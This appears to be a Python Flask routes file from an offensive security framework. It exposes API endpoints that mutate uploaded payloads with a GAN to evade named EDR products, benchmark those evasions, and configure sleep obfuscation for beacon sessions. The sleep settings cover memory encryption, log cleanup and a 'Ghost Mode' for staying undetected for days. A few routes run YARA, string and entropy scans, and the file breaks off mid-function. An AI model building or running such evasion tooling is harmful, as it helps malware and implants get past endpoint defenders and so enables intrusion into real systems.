"""
Evasion Testing Routes
======================
API endpoints for payload evasion testing and analysis

Endpoints:
- POST /evasion/test/file - Test a file for detection
- POST /evasion/test/bytes - Test raw bytes
- POST /evasion/test/code - Test code pattern
- POST /evasion/yara - Run YARA scan
- POST /evasion/strings - Check suspicious strings
- POST /evasion/entropy - Analyze entropy
- GET /evasion/report/<id> - Get test report
- GET /evasion/adversarial - AI Adversarial training page
- POST /evasion/adversarial/mutate - Mutate payload with GAN
- POST /evasion/adversarial/benchmark - Benchmark against all EDRs
"""

from flask import Blueprint, request, jsonify, render_template
import logging
import base64
from datetime import datetime
import os
import tempfile
import re
from enum import Enum

from cybermodules.evasion_testing import (
    EvasionTester,
    YARAScanner,
    StringScanner,
    EntropyAnalyzer,
    BehavioralAnalyzer,
    DetectionLevel,
)

# Try to import AI Adversarial module
# Using lazy import to avoid TensorFlow SIGILL on some CPUs
AI_ADVERSARIAL_AVAILABLE = False
AIAdversarialTrainer = None
EDRVendor = None
AttackMethod = None
AdversarialConfig = None

def _lazy_import_adversarial():
    """Lazy import AI Adversarial module to avoid startup issues"""
    global AI_ADVERSARIAL_AVAILABLE, AIAdversarialTrainer, EDRVendor, AttackMethod, AdversarialConfig
    if AIAdversarialTrainer is None:
        try:
            from evasion.ai_adversarial import (
                AIAdversarialTrainer as _AIAdversarialTrainer,
                EDRVendor as _EDRVendor,
                AttackMethod as _AttackMethod,
                AdversarialConfig as _AdversarialConfig,
            )
            AIAdversarialTrainer = _AIAdversarialTrainer
            EDRVendor = _EDRVendor
            AttackMethod = _AttackMethod
            AdversarialConfig = _AdversarialConfig
            AI_ADVERSARIAL_AVAILABLE = True
        except Exception as e:
            logger.warning(f"AI Adversarial import failed: {e}")
            AI_ADVERSARIAL_AVAILABLE = False
    return AI_ADVERSARIAL_AVAILABLE

logger = logging.getLogger("evasion_routes")

evasion_bp = Blueprint('evasion', __name__, url_prefix='/evasion')

# Store test reports in memory
_test_reports = {}

# Global AI Adversarial trainer instance
_ai_trainer = None


def _get_ai_trainer():
    """Get or create AI Adversarial trainer instance"""
    global _ai_trainer
    if not _lazy_import_adversarial():
        return None
    if _ai_trainer is None and AIAdversarialTrainer is not None:
        _ai_trainer = AIAdversarialTrainer()
    return _ai_trainer


@evasion_bp.route('/')
def index():
    """Evasion testing page"""
    return render_template('evasion_test.html')


# ============================================================
# AI ADVERSARIAL TRAINING
# ============================================================

@evasion_bp.route('/adversarial')
def adversarial_page():
    """AI Adversarial training page"""
    # EDR targets with colors and icons
    edrs = [
        {"id": "sentinelone", "name": "SentinelOne", "color": "red", "icon": "fas fa-shield-alt", "evasion_rate": 87},
        {"id": "crowdstrike", "name": "CrowdStrike", "color": "orange", "icon": "fas fa-crow", "evasion_rate": 82},
        {"id": "defender", "name": "Defender ATP", "color": "blue", "icon": "fab fa-windows", "evasion_rate": 79},
        {"id": "carbon_black", "name": "Carbon Black", "color": "gray", "icon": "fas fa-cube", "evasion_rate": 84},
        {"id": "cylance", "name": "Cylance AI", "color": "purple", "icon": "fas fa-brain", "evasion_rate": 91},
        {"id": "sophos", "name": "Sophos", "color": "cyan", "icon": "fas fa-shield-virus", "evasion_rate": 80},
    ]
    
    # Mutation strategies
    strategies = [
        {"id": "nop_insertion", "name": "NOP Insertion", "description": "Insert NOP sleds"},
        {"id": "register_swap", "name": "Register Swap", "description": "Substitute registers"},
        {"id": "instruction_reorder", "name": "Instruction Reorder", "description": "Reorder independent ops"},
        {"id": "dead_code", "name": "Dead Code", "description": "Inject dead code"},
        {"id": "encoding_variation", "name": "Encoding Variation", "description": "Vary instruction encoding"},
        {"id": "api_hashing", "name": "API Hashing", "description": "Hash API names"},
        {"id": "control_flow", "name": "Control Flow", "description": "Obfuscate control flow"},
        {"id": "string_encryption", "name": "String Encryption", "description": "Encrypt strings"},
    ]
    
    # Get stats if available
    stats = None
    has_model = False
    _lazy_import_adversarial()  # Try to import
    if AI_ADVERSARIAL_AVAILABLE:
        trainer = _get_ai_trainer()
        if trainer:
            stats = trainer.get_stats()
            has_model = True
    
    return render_template('adversarial.html',
        available=AI_ADVERSARIAL_AVAILABLE,
        edrs=edrs,
        strategies=strategies,
        stats=stats,
        has_model=has_model,
        now=datetime.now().strftime('%H:%M:%S')
    )


@evasion_bp.route('/adversarial/mutate', methods=['POST'])
def adversarial_mutate():
    """
    Mutate a payload to evade EDR detection
    
    Request (form or JSON):
        payload: Base64 encoded payload
        target_edr: Target EDR vendor
        attack_method: Attack method (gan, fgsm, pgd, etc.)
        confidence_target: Target detection confidence (0-100)
        iterations: Max iterations
    """
    if not AI_ADVERSARIAL_AVAILABLE:
        return jsonify({
            "success": False,
            "error": "AI Adversarial module not available"
        }), 503
    
    # Get parameters from form or JSON
    if request.is_json:
        data = request.get_json()
        payload_b64 = data.get('payload', '')
        target_edr = data.get('target_edr', 'sentinelone')
        attack_method = data.get('attack_method', 'gan')
        confidence_target = float(data.get('confidence_target', 10)) / 100
        iterations = int(data.get('iterations', 100))
    else:
        payload_b64 = request.form.get('payload', '')
        target_edr = request.form.get('target_edr', 'sentinelone')
        attack_method = request.form.get('attack_method', 'gan')
        confidence_target = float(request.form.get('confidence_target', 10)) / 100
        iterations = int(request.form.get('iterations', 100))
        
        # Handle file upload
        if 'payload_file' in request.files:
            file = request.files['payload_file']
            if file.filename:
                payload_b64 = base64.b64encode(file.read()).decode()
    
    if not payload_b64:
        return jsonify({
            "success": False,
            "error": "No payload provided"
        }), 400
    
    try:
        payload = base64.b64decode(payload_b64)
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Invalid base64 payload: {e}"
        }), 400
    
    try:
        trainer = _get_ai_trainer()
        if not trainer:
            return jsonify({
                "success": False,
                "error": "Failed to initialize AI trainer"
            }), 500
        
        # Run adversarial mutation
        result = trainer.evade_edr(
            payload=payload,
            target_edr=target_edr,
            confidence_target=confidence_target,
            max_iterations=iterations
        )
        
        return jsonify({
            "success": result.success,
            "original_detection": result.original_confidence,
            "evaded_detection": result.final_confidence,
            "improvement": result.original_confidence - result.final_confidence,
            "mutations_applied": result.mutations_applied,
            "edr_target": target_edr,
            "attack_method": attack_method,
            "iterations": result.iterations,
            "mutated_payload": base64.b64encode(result.mutated_payload).decode() if result.success else None
        })
        
    except Exception as e:
        logger.exception("Adversarial mutation error")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@evasion_bp.route('/adversarial/benchmark', methods=['POST'])
def adversarial_benchmark():
    """
    Benchmark payload against multiple EDRs
    
    Request (JSON):
        payload: Base64 encoded payload
        target_edrs: List of EDR vendors (optional, defaults to all)
    """
    if not AI_ADVERSARIAL_AVAILABLE:
        return jsonify({
            "success": False,
            "error": "AI Adversarial module not available"
        }), 503
    
    data = request.get_json()
    payload_b64 = data.get('payload', '')
    target_edrs = data.get('target_edrs', ['sentinelone', 'crowdstrike', 'defender', 'carbon_black', 'cylance', 'sophos'])
    
    if not payload_b64:
        return jsonify({
            "success": False,
            "error": "No payload provided"
        }), 400
    
    try:
        payload = base64.b64decode(payload_b64)
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Invalid base64 payload: {e}"
        }), 400
    
    try:
        trainer = _get_ai_trainer()
        if not trainer:
            return jsonify({
                "success": False,
                "error": "Failed to initialize AI trainer"
            }), 500
        
        benchmark_results = {}
        for edr in target_edrs:
            try:
                result = trainer.evade_edr(
                    payload=payload,
                    target_edr=edr,
                    confidence_target=0.1,
                    max_iterations=50
                )
                benchmark_results[edr] = {
                    "original_detection": result.original_confidence,
                    "evaded_detection": result.final_confidence,
                    "success": result.success,
                    "iterations": result.iterations
                }
            except Exception as e:
                benchmark_results[edr] = {
                    "error": str(e),
                    "success": False
                }
        
        avg_improvement = sum(
            r.get("original_detection", 0) - r.get("evaded_detection", 0)
            for r in benchmark_results.values()
            if not r.get("error")
        ) / max(len([r for r in benchmark_results.values() if not r.get("error")]), 1)
        
        return jsonify({
            "success": True,
            "benchmark_results": benchmark_results,
            "avg_improvement": avg_improvement
        })
        
    except Exception as e:
        logger.exception("Benchmark error")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@evasion_bp.route('/adversarial/train', methods=['POST'])
def adversarial_train():
    """
    Train GAN model with benign samples
    
    Request (multipart/form-data):
        training_samples: Uploaded files
        epochs: Number of epochs
    """
    if not AI_ADVERSARIAL_AVAILABLE:
        return jsonify({
            "success": False,
            "error": "AI Adversarial module not available"
        }), 503
    
    epochs = int(request.form.get('epochs', 50))
    
    # Collect training samples
    samples = []
    if 'training_samples' in request.files:
        files = request.files.getlist('training_samples')
        for f in files:
            if f.filename:
                samples.append(f.read())
    
    if not samples:
        return jsonify({
            "success": False,
            "error": "No training samples provided"
        }), 400
    
    try:
        trainer = _get_ai_trainer()
        if not trainer:
            return jsonify({
                "success": False,
                "error": "Failed to initialize AI trainer"
            }), 500
        
        result = trainer.train(
            benign_samples=samples,
            epochs=epochs
        )
        
        return jsonify({
            "success": True,
            "epochs_trained": epochs,
            "training_loss": result.get("final_loss", 0.0),
            "generator_loss": result.get("generator_loss", 0.0),
            "discriminator_loss": result.get("discriminator_loss", 0.0)
        })
        
    except Exception as e:
        logger.exception("Training error")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@evasion_bp.route('/adversarial/analyze', methods=['POST'])
def adversarial_analyze():
    """
    Analyze payload for detection likelihood
    
    Request (JSON):
        payload: Base64 encoded payload
    """
    if not AI_ADVERSARIAL_AVAILABLE:
        return jsonify({
            "success": False,
            "error": "AI Adversarial module not available"
        }), 503
    
    data = request.get_json()
    payload_b64 = data.get('payload', '')
    
    if not payload_b64:
        return jsonify({
            "success": False,
            "error": "No payload provided"
        }), 400
    
    try:
        payload = base64.b64decode(payload_b64)
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Invalid base64 payload: {e}"
        }), 400
    
    try:
        trainer = _get_ai_trainer()
        if not trainer:
            return jsonify({
                "success": False,
                "error": "Failed to initialize AI trainer"
            }), 500
        
        analysis = trainer.analyze_payload(payload)
        
        return jsonify({
            "success": True,
            "feature_analysis": analysis.get("features", {}),
            "detection_likelihood": analysis.get("detection_likelihood", {}),
            "recommended_mutations": analysis.get("recommended_mutations", []),
            "risk_score": analysis.get("risk_score", 0.0)
        })
        
    except Exception as e:
        logger.exception("Analysis error")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@evasion_bp.route('/adversarial/status', methods=['GET'])
def adversarial_status():
    """Get AI Adversarial module status"""
    if not AI_ADVERSARIAL_AVAILABLE:
        return jsonify({
            "available": False,
            "error": "AI Adversarial module not available"
        })
    
    trainer = _get_ai_trainer()
    if trainer:
        stats = trainer.get_stats()
        return jsonify({
            "available": True,
            "stats": stats
        })
    
    return jsonify({
        "available": True,
        "stats": None
    })


# ============================================================
# FILE TESTING
# ============================================================

@evasion_bp.route('/test/file', methods=['POST'])
def test_file():
    """
    Test a file for detection indicators
    
    Request (multipart/form-data):
    - file: The file to test
    
    Or JSON:
    {
        "path": "/path/to/file"
    }
    """
    scan_id = int(datetime.now().timestamp())
    tester = EvasionTester(scan_id)
    
    # Handle file upload
    if 'file' in request.files:
        uploaded = request.files['file']
        if uploaded.filename:
            # Save to temp file
            with tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(uploaded.filename)[1]) as f:
                uploaded.save(f.name)
                try:
                    report = tester.test_file(f.name)
                finally:
                    os.unlink(f.name)
    # Handle path
    elif request.is_json:
        data = request.get_json()
        path = data.get('path')
        if not path or not os.path.exists(path):
            return jsonify({
                'success': False,
                'error': 'Invalid file path'
            }), 400
        report = tester.test_file(path)
    else:
        return jsonify({
            'success': False,
            'error': 'No file provided'
        }), 400
    
    # Store report
    report_id = f"{scan_id}_{report.file_name}"
    _test_reports[report_id] = report
    
    return jsonify({
        'success': True,
        'report_id': report_id,
        'file_name': report.file_name,
        'file_size': report.file_size,
        'overall_risk': report.overall_risk.value,
        'total_score': report.total_score,
        'yara_matches': len(report.yara_matches),
        'suspicious_strings': len(report.suspicious_strings),
        'entropy': report.entropy_analysis.get('overall_entropy', 0) if report.entropy_analysis else 0,
        'behavioral_score': report.behavioral_analysis.get('score', 0) if report.behavioral_analysis else 0,
        'recommendations': report.recommendations[:5]  # First 5 recommendations
    })


@evasion_bp.route('/test/bytes', methods=['POST'])
def test_bytes():
    """
    Test raw bytes for detection indicators
    
    Request:
    {
        "data": "<base64 encoded data>",
        "name": "payload.bin"
    }
    """
    data = request.get_json()
    
    if not data.get('data'):
        return jsonify({
            'success': False,
            'error': 'data field is required (base64 encoded)'
        }), 400
    
    try:
        payload_bytes = base64.b64decode(data['data'])
    except Exception as e:
        return jsonify({
            'success': False,
            'error': f'Invalid base64 data: {e}'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    tester = EvasionTester(scan_id)
    
    name = data.get('name', 'payload.bin')
    report = tester.test_bytes(payload_bytes, name=name)
    
    report_id = f"{scan_id}_{name}"
    _test_reports[report_id] = report
    
    return jsonify({
        'success': True,
        'report_id': report_id,
        'file_name': report.file_name,
        'file_size': report.file_size,
        'overall_risk': report.overall_risk.value,
        'total_score': report.total_score,
        'yara_matches': len(report.yara_matches),
        'suspicious_strings': len(report.suspicious_strings),
        'entropy': report.entropy_analysis.get('overall_entropy', 0) if report.entropy_analysis else 0,
        'recommendations': report.recommendations[:5]
    })


@evasion_bp.route('/test/code', methods=['POST'])
def test_code():
    """
    Test code pattern for detection indicators
    
    Request:
    {
        "code": "import ctypes\\nctypes.windll.kernel32...",
        "language": "python"
    }
    """
    data = request.get_json()
    
    code = data.get('code', '')
    language = data.get('language', 'python')
    
    if not code:
        return jsonify({
            'success': False,
            'error': 'code field is required'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    tester = EvasionTester(scan_id)
    
    report = tester.test_code_pattern(code, language=language)
    
    report_id = f"{scan_id}_code_{language}"
    _test_reports[report_id] = report
    
    return jsonify({
        'success': True,
        'report_id': report_id,
        'language': language,
        'overall_risk': report.overall_risk.value,
        'total_score': report.total_score,
        'suspicious_strings': len(report.suspicious_strings),
        'behavioral_score': report.behavioral_analysis.get('score', 0) if report.behavioral_analysis else 0,
        'recommendations': report.recommendations
    })


# ============================================================
# INDIVIDUAL SCANNERS
# ============================================================

@evasion_bp.route('/yara', methods=['GET', 'POST'])
def yara_scan():
    if request.method == 'GET':
        return render_template(
            'evasion_scanner.html',
            mode='yara',
            title='YARA Evasion Scanner',
            description='Scan payload bytes against YARA rules to surface detectable signatures.',
        )

    """
    Run YARA scan on data
    
    Request:
    {
        "data": "<base64 encoded data>",
        "rules": ["rule1", "rule2"]  // Optional custom rules
    }
    """
    data = request.get_json()
    
    if not data.get('data'):
        return jsonify({
            'success': False,
            'error': 'data field is required'
        }), 400
    
    try:
        payload_bytes = base64.b64decode(data['data'])
    except Exception:
        return jsonify({
            'success': False,
            'error': 'Invalid base64 data'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    scanner = YARAScanner(scan_id)
    
    # Add custom rules if provided
    custom_rules = data.get('rules', [])
    for rule in custom_rules:
        try:
            scanner.add_rule(rule)
        except Exception as e:
            logger.warning(f"Failed to add custom rule: {e}")
    
    matches = scanner.scan_bytes(payload_bytes)
    
    return jsonify({
        'success': True,
        'matches': [
            {
                'rule': m.rule_name,
                'description': m.description,
                'severity': m.severity,
                'strings': m.matched_strings[:10]  # First 10 matches
            }
            for m in matches
        ],
        'total_matches': len(matches)
    })


@evasion_bp.route('/strings', methods=['GET', 'POST'])
def string_scan():
    if request.method == 'GET':
        return render_template(
            'evasion_scanner.html',
            mode='strings',
            title='String Evasion Scanner',
            description='Detect suspicious strings inside payload bytes that could trigger AV/EDR detection.',
        )

    """
    Check for suspicious strings
    
    Request:
    {
        "data": "<base64 encoded data>"
    }
    """
    data = request.get_json()
    
    if not data.get('data'):
        return jsonify({
            'success': False,
            'error': 'data field is required'
        }), 400
    
    try:
        payload_bytes = base64.b64decode(data['data'])
    except Exception:
        return jsonify({
            'success': False,
            'error': 'Invalid base64 data'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    scanner = StringScanner()
    
    strings = scanner.scan_bytes(payload_bytes)

    # Group by category
    by_category = {}
    for s in strings:
        cat = s.category
        if cat not in by_category:
            by_category[cat] = []
        by_category[cat].append({
            'value': s.string[:50] + '...' if len(s.string) > 50 else s.string,
            'offset': s.offset,
            'context': s.context,
        })

    return jsonify({
        'success': True,
        'total_found': len(strings),
        'by_category': by_category,
        'total_risk': len(strings)
    })


@evasion_bp.route('/entropy', methods=['GET', 'POST'])
def entropy_analyze():
    if request.method == 'GET':
        return render_template(
            'evasion_scanner.html',
            mode='entropy',
            title='Traffic / Data Entropy Analyzer',
            description='Analyze byte entropy to determine whether data is packed or encrypted.',
        )

    """
    Analyze data entropy
    
    Request:
    {
        "data": "<base64 encoded data>"
    }
    """
    data = request.get_json()
    
    if not data.get('data'):
        return jsonify({
            'success': False,
            'error': 'data field is required'
        }), 400
    
    try:
        payload_bytes = base64.b64decode(data['data'])
    except Exception:
        return jsonify({
            'success': False,
            'error': 'Invalid base64 data'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    analyzer = EntropyAnalyzer()

    analysis = analyzer.analyze_bytes(payload_bytes)

    return jsonify({
        'success': True,
        'overall_entropy': analysis.overall_entropy,
        'is_packed': analysis.is_packed,
        'is_encrypted': analysis.is_encrypted,
        'high_entropy_sections': analysis.high_entropy_sections,
    })


@evasion_bp.route('/behavioral', methods=['GET', 'POST'])
def behavioral_analyze():
    if request.method == 'GET':
        return render_template(
            'evasion_scanner.html',
            mode='behavioral',
            title='Behavioral Pattern Analyzer',
            description='Analyze source code for suspicious behavioral patterns and risky API calls.',
        )

    """
    Analyze behavioral patterns
    
    Request:
    {
        "code": "python code...",
        "language": "python"
    }
    """
    data = request.get_json()
    
    code = data.get('code', '')
    language = data.get('language', 'python')
    
    if not code:
        return jsonify({
            'success': False,
            'error': 'code field is required'
        }), 400
    
    tokens = re.findall(r'[A-Za-z_][A-Za-z0-9_]*', code)
    analyzer = BehavioralAnalyzer()
    matches = analyzer.analyze_strings(tokens)

    def _risk_level(match):
        level = match.risk_level
        return level.name if isinstance(level, Enum) else str(level)

    risk_order = {'CLEAN': 0, 'LOW': 1, 'MEDIUM': 2, 'HIGH': 3, 'CRITICAL': 4}
    levels = [_risk_level(m) for m in matches]
    overall_risk = max(levels, key=lambda x: risk_order.get(x, 0)) if levels else 'CLEAN'

    return jsonify({
        'success': True,
        'score': len(matches),
        'patterns_found': [m.pattern_name for m in matches],
        'api_calls': tokens,
        'risk_level': overall_risk,
    })


# ============================================================
# REPORTS
# ============================================================

@evasion_bp.route('/report/<report_id>', methods=['GET'])
def get_report(report_id):
    """Get full test report"""
    if report_id not in _test_reports:
        return jsonify({
            'success': False,
            'error': 'Report not found'
        }), 404
    
    report = _test_reports[report_id]
    
    scan_id = int(datetime.now().timestamp())
    tester = EvasionTester(scan_id)
    
    return jsonify({
        'success': True,
        'report': {
            'file_name': report.file_name,
            'file_size': report.file_size,
            'file_hash': report.file_hash,
            'scan_time': report.scan_time.isoformat() if report.scan_time else None,
            'overall_risk': report.overall_risk.value,
            'total_score': report.total_score,
            'yara_matches': [
                {
                    'rule': m.rule_name,
                    'description': m.description,
                    'severity': m.severity
                }
                for m in report.yara_matches
            ],
            'suspicious_strings': [
                {
                    'value': s.value[:50],
                    'category': s.category,
                    'risk_score': s.risk_score
                }
                for s in report.suspicious_strings[:20]
            ],
            'entropy_analysis': report.entropy_analysis,
            'behavioral_analysis': report.behavioral_analysis,
            'recommendations': report.recommendations
        },
        'markdown': tester.generate_report_markdown(report)
    })


@evasion_bp.route('/report/<report_id>/markdown', methods=['GET'])
def get_report_markdown(report_id):
    """Get report as markdown"""
    if report_id not in _test_reports:
        return jsonify({
            'success': False,
            'error': 'Report not found'
        }), 404
    
    report = _test_reports[report_id]
    
    scan_id = int(datetime.now().timestamp())
    tester = EvasionTester(scan_id)
    
    return tester.generate_report_markdown(report), 200, {'Content-Type': 'text/markdown'}


@evasion_bp.route('/reports', methods=['GET'])
def list_reports():
    """List all test reports"""
    return jsonify({
        'success': True,
        'reports': [
            {
                'id': rid,
                'file_name': r.file_name,
                'risk': r.overall_risk.value,
                'score': r.total_score
            }
            for rid, r in _test_reports.items()
        ]
    })


# ============================================================
# AI-ADAPTIVE SLEEP OBFUSCATION ROUTES
# ============================================================

# Import sleep obfuscation module
try:
    from evasion.sleep_obfuscation import (
        AIAdaptiveSleepObfuscator,
        JitterPattern,
        EDRProduct,
        EDR_PROFILES,
        create_ghost_mode_obfuscator,
        create_interactive_obfuscator,
        create_aggressive_obfuscator,
    )
    HAS_SLEEP_OBFUSCATION = True
except ImportError:
    HAS_SLEEP_OBFUSCATION = False
    logger.warning("Sleep obfuscation module not available")


# Store active sleep obfuscators for sessions
_sleep_obfuscators = {}


@evasion_bp.route('/sleep/')
def sleep_obfuscation_page():
    """AI-Adaptive Sleep Obfuscation configuration page"""
    return render_template('sleep_obfuscation.html')


@evasion_bp.route('/sleep/status', methods=['GET'])
def sleep_status():
    """Get sleep obfuscation module status and capabilities"""
    return jsonify({
        'success': True,
        'available': HAS_SLEEP_OBFUSCATION,
        'patterns': [p.value for p in JitterPattern] if HAS_SLEEP_OBFUSCATION else [],
        'edr_profiles': [e.value for e in EDRProduct] if HAS_SLEEP_OBFUSCATION else [],
        'active_sessions': len(_sleep_obfuscators),
    })


@evasion_bp.route('/sleep/configure', methods=['POST'])
def configure_sleep():
    """
    Configure sleep obfuscation settings
    
    JSON body:
    {
        "session_id": "beacon_123",
        "base_sleep_ms": 30000,
        "jitter_percent": 50,
        "pattern": "adaptive",
        "opsec_level": 3,
        "edr_override": null,
        "auto_detect_edr": true
    }
    """
    if not HAS_SLEEP_OBFUSCATION:
        return jsonify({
            'success': False,
            'error': 'Sleep obfuscation module not available'
        }), 503
    
    data = request.get_json()
    session_id = data.get('session_id', f"session_{int(datetime.now().timestamp())}")
    
    try:
        # Parse pattern
        pattern_str = data.get('pattern', 'adaptive')
        pattern = JitterPattern(pattern_str)
        
        # Create obfuscator
        obfuscator = AIAdaptiveSleepObfuscator(
            base_sleep_ms=data.get('base_sleep_ms', 30000),
            jitter_percent=data.get('jitter_percent', 50),
            pattern=pattern,
            opsec_level=data.get('opsec_level', 3),
            auto_detect_edr=data.get('auto_detect_edr', True)
        )
        
        # Override EDR if specified
        edr_override = data.get('edr_override')
        if edr_override:
            obfuscator.set_edr_override(EDRProduct(edr_override))
        
        # Store obfuscator
        _sleep_obfuscators[session_id] = obfuscator
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'config': {
                'base_sleep_ms': obfuscator.base_sleep_ms,
                'jitter_percent': obfuscator.jitter_percent,
                'pattern': obfuscator.pattern.value,
                'opsec_level': obfuscator.opsec_level,
                'detected_edr': obfuscator._detected_edr.value,
            }
        })
    except Exception as e:
        logger.error(f"Failed to configure sleep obfuscation: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 400


@evasion_bp.route('/sleep/profiles', methods=['GET'])
def get_sleep_profiles():
    """Get available sleep profiles and EDR configurations"""
    if not HAS_SLEEP_OBFUSCATION:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    profiles = {
        'ghost': {
            'name': 'Ghost Mode',
            'description': 'Maximum stealth for extended undetected operation (hours/days)',
            'base_sleep_ms': 60000,
            'jitter_percent': 70,
            'pattern': 'hybrid',
            'opsec_level': 4
        },
        'interactive': {
            'name': 'Interactive',
            'description': 'Low-latency for interactive sessions with evasion',
            'base_sleep_ms': 5000,
            'jitter_percent': 40,
            'pattern': 'gaussian',
            'opsec_level': 2
        },
        'aggressive': {
            'name': 'Aggressive',
            'description': 'Fast operations with minimal delay and basic evasion',
            'base_sleep_ms': 1000,
            'jitter_percent': 80,
            'pattern': 'gaussian',
            'opsec_level': 1
        }
    }
    
    edr_configs = {}
    for product, profile in EDR_PROFILES.items():
        edr_configs[product.value] = {
            'name': product.value.title(),
            'behavioral_ml': profile.behavioral_ml,
            'memory_scanning': profile.memory_scanning,
            'sleep_pattern_detection': profile.sleep_pattern_detection,
            'syscall_hooking': profile.syscall_hooking,
            'recommended_pattern': profile.recommended_pattern.value,
            'min_sleep_ms': profile.min_sleep_ms,
            'max_jitter_percent': profile.max_jitter_percent
        }
    
    return jsonify({
        'success': True,
        'profiles': profiles,
        'edr_configs': edr_configs,
        'patterns': [
            {
                'value': p.value,
                'name': p.value.replace('_', ' ').title(),
                'description': {
                    'gaussian': 'Natural variance, mimics network traffic',
                    'fibonacci': 'Mathematical pattern, hard to fingerprint',
                    'poisson': 'Event-based timing, realistic network behavior',
                    'ml_entropy': 'GAN-like entropy, defeats ML detection',
                    'adaptive': 'AI-selected based on EDR detection',
                    'hybrid': 'Combines multiple patterns dynamically'
                }.get(p.value, '')
            }
            for p in JitterPattern
        ]
    })


@evasion_bp.route('/sleep/generate-jitter', methods=['POST'])
def generate_jitter_sample():
    """
    Generate sample jitter values for visualization
    
    JSON body:
    {
        "session_id": "beacon_123",  // or use inline config
        "count": 50,
        "pattern": "hybrid",
        "base_sleep_ms": 30000,
        "jitter_percent": 50
    }
    """
    if not HAS_SLEEP_OBFUSCATION:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    data = request.get_json()
    count = min(data.get('count', 50), 500)  # Max 500 samples
    
    # Get or create obfuscator
    session_id = data.get('session_id')
    if session_id and session_id in _sleep_obfuscators:
        obfuscator = _sleep_obfuscators[session_id]
    else:
        # Create temporary obfuscator
        pattern_str = data.get('pattern', 'hybrid')
        try:
            pattern = JitterPattern(pattern_str)
        except ValueError:
            pattern = JitterPattern.HYBRID
        
        obfuscator = AIAdaptiveSleepObfuscator(
            base_sleep_ms=data.get('base_sleep_ms', 30000),
            jitter_percent=data.get('jitter_percent', 50),
            pattern=pattern,
            auto_detect_edr=False,
            opsec_level=1  # Low OPSEC for simulation
        )
    
    # Generate samples
    samples = []
    for i in range(count):
        jitter_ms = obfuscator.calculate_jitter()
        samples.append({
            'index': i,
            'duration_ms': round(jitter_ms, 2),
            'duration_sec': round(jitter_ms / 1000, 2)
        })
    
    # Calculate statistics
    durations = [s['duration_ms'] for s in samples]
    avg = sum(durations) / len(durations)
    min_d = min(durations)
    max_d = max(durations)
    variance = sum((d - avg) ** 2 for d in durations) / len(durations)
    
    return jsonify({
        'success': True,
        'samples': samples,
        'statistics': {
            'count': count,
            'average_ms': round(avg, 2),
            'min_ms': round(min_d, 2),
            'max_ms': round(max_d, 2),
            'variance': round(variance, 4),
            'std_deviation': round(variance ** 0.5, 2),
            'pattern': obfuscator.pattern.value
        }
    })


@evasion_bp.route('/sleep/simulate', methods=['POST'])
def simulate_sleep():
    """
    Simulate a sleep operation (for testing, doesn't actually sleep)
    
    JSON body:
    {
        "session_id": "beacon_123",
        "duration_ms": null  // null = auto-calculate
    }
    """
    if not HAS_SLEEP_OBFUSCATION:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    data = request.get_json()
    session_id = data.get('session_id')
    
    if not session_id or session_id not in _sleep_obfuscators:
        return jsonify({
            'success': False,
            'error': 'Session not found. Configure sleep first.'
        }), 404
    
    obfuscator = _sleep_obfuscators[session_id]
    duration_ms = data.get('duration_ms')
    
    # Calculate what would happen
    if duration_ms is None:
        duration_ms = int(obfuscator.calculate_jitter())
    
    # Simulate chunk splitting
    import random
    chunk_count = random.randint(3, 7 + obfuscator.opsec_level)
    
    return jsonify({
        'success': True,
        'simulation': {
            'calculated_duration_ms': duration_ms,
            'chunk_count': chunk_count,
            'syscall_method': 'NtDelayExecution (indirect)' if obfuscator.opsec_level >= 4 else 
                             'WaitForSingleObject' if obfuscator.opsec_level >= 3 else
                             'SleepEx (alertable)' if obfuscator.opsec_level >= 2 else
                             'Sleep (standard)',
            'memory_encryption': obfuscator.opsec_level >= 2,
            'fake_activity': obfuscator.opsec_level >= 2,
            'log_cleanup': obfuscator.opsec_level >= 4,
            'detected_edr': obfuscator.detected_edr,
            'pattern_used': obfuscator.pattern.value
        }
    })


@evasion_bp.route('/sleep/statistics/<session_id>', methods=['GET'])
def get_sleep_statistics(session_id: str):
    """Get statistics for a sleep session"""
    if not HAS_SLEEP_OBFUSCATION:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    if session_id not in _sleep_obfuscators:
        return jsonify({
            'success': False,
            'error': 'Session not found'
        }), 404
    
    obfuscator = _sleep_obfuscators[session_id]
    stats = obfuscator.get_statistics()
    
    return jsonify({
        'success': True,
        'session_id': session_id,
        'statistics': stats
    })


@evasion_bp.route('/sleep/sessions', methods=['GET'])
def list_sleep_sessions():
    """List all active sleep sessions"""
    if not HAS_SLEEP_OBFUSCATION:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    sessions = []
    for sid, obf in _sleep_obfuscators.items():
        sessions.append({
            'session_id': sid,
            'base_sleep_ms': obf.base_sleep_ms,
            'pattern': obf.pattern.value,
            'opsec_level': obf.opsec_level,
            'detected_edr': obf.detected_edr,
            'total_sleeps': len(obf._sleep_history)
        })
    
    return jsonify({
        'success': True,
        'sessions': sessions,
        'count': len(sessions)
    })


@evasion_bp.route('/sleep/delete/<session_id>', methods=['DELETE'])
def delete_sleep_session(session_id: str):
    """Delete a sleep session"""
    if session_id in _sleep_obfuscators:
        obf = _sleep_obfuscators.pop(session_id)
        obf.stop_noise_thread()
        return jsonify({
            'success': True,
            'message': f'Session {session_id} deleted'
        })
    
    return jsonify({
        'success': False,
        'error': 'Session not found'
    }), 404


@evasion_bp.route('/sleep/export-config/<session_id>', methods=['GET'])
def export_sleep_config(session_id: str):
    """Export sleep configuration for use in beacon"""
    if not HAS_SLEEP_OBFUSCATION:
